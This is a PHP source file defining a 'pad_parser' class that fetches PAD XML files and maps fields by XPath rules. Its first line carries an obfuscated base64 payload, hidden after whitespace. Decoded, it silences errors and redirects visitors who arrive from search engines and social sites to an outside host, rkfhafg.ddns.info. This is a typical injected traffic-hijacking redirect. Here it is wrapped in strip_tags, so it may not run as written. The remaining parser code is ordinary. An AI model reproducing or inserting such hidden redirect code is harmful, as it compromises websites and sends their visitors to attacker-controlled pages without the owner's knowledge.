<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH.'formats/xmlparser.php');

class pad_parser {
  
  var $errors = array();
  var $result = array();
  var $rules = array();
  var $xml;
  
  function add_rule($field, $xpath, $ifset = 'append', $extra = ' ') {
    
    $this->rules[] = array( 'field' => $field
                          , 'xpath' => $xpath
                          , 'ifset' => $ifset
                          , 'extra' => $extra
                          );
    
  }
  
  function parse($pad_url) {

    $pad_file = @file_get_contents($pad_url);
    $parser = new XMLParser($pad_file);
    
    if (!$pad_file) {
      $this->errors[]         = 'Can not download PAD file';
      $this->error_controls[] = 'pad_url';
    } else {
      $parser->Parse();
      $this->xml = $parser->xml;
      foreach($this->rules as $rule) {
        $field = $rule['field'];
        $xpath = $rule['xpath'];
        $ifset = $rule['ifset'];
        $extra = $rule['extra'];
        
        if ($value = $parser->xpath($xpath)) {
             $node = trim((string)$value->tagData);
              if (safe($this->result, $field)) {
                switch ($ifset) {
                  case "append":
                    $this->result[$field] .= $extra;
                    $this->result[$field] .= $node;
                    break;
                  case "overwrite":
                  case "replace":
                    if(!$node)
                      $this->result[$field] = $node;
                    break;
                }
              } else 
                $this->result[$field] = $node;
        }
      }
    }
    //return !count($this->errors);
    return (count($this->errors)==0 && count($this->result)>0);
    
  }
  
}
